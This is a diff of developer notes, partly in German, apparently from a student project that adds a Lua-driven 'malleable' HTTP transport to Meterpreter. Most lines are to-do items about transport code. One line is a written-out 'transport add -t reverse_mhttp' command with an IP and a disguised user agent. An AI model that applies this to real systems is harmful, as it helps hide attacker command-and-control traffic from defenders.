@@ -203,6 +203,24 @@ sudo docker build -t myopenresty -f bionic/Dockerfile .;sudo docker run -p80:80 
 
 * When implementing a transport we have to check if we keep the LUA approach  on the client side, or if we want to decode the pacakages in ruby. (Client: Ruby, Server: C with LUA interpreter) || (Client: Ruby with LUA interpreter, Server: C with LUA interpreter)
 
+* Bunch of stuff copied from `server_transport_http` to `server_transport_http_malleable`, we are overriding tons of `transport->` and `ctx-> ` in (line 900+) mby we need ot only override the things in `transport_move_to_malleable` though (as seen in wininet)
+
+* Keep malleable in an extension so we don't ~HAVE~ to ship LUA with every Meterpreter and transport?
+
+* Make extra malleable transport flag, `base_dispatch.c` line 19 would probably be a good start
+
+* Anstatt derzeitiger loesung mit flag die umschaellt wie bei wininet, neue loesung mit url mhttp!!!
+
+* transport_config.rb lets us see how scheemes (and transports?) are set
+
+* test with initial malleable transport and with added malleable transport
+
+* if transport cant be initialized (and we have no valid transports we nuke the CPU) `transport initialisation failed, moving to the next transport`
+
+* own transport works now, need to check if CHANGING into the transport works aswell. (as initial transport version it works (in metasploit framework `setg OverrideScheme mhttp`))
+
+* need to readd lua interpreter in own transport, then need to rewrite recieve and send functions to encode and decode (and need to add lua in ruby)
+
 # Bisherige Schritte
 
 1. Basic functionality Extension zum laufen gebracht
@@ -210,3 +228,11 @@ sudo docker build -t myopenresty -f bionic/Dockerfile .;sudo docker run -p80:80 
 3. Reverse proxy aufgesetzt (openresty)
 4. Integrated LUA dll into meterpreter
 5. Make LUA take script string
+
+# Notes
+
+* `/home/timo/Tools/bachelor/metasploit-framework/lib/rex/post/meterpreter`
+
+* `transport add -t reverse_mhttp -l 192.168.42.131 -p 5555 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"`
+
+# * Anstatt derzeitiger loesung mit flag die umschaellt wie bei wininet, neue loesung mit url mhttp!!!
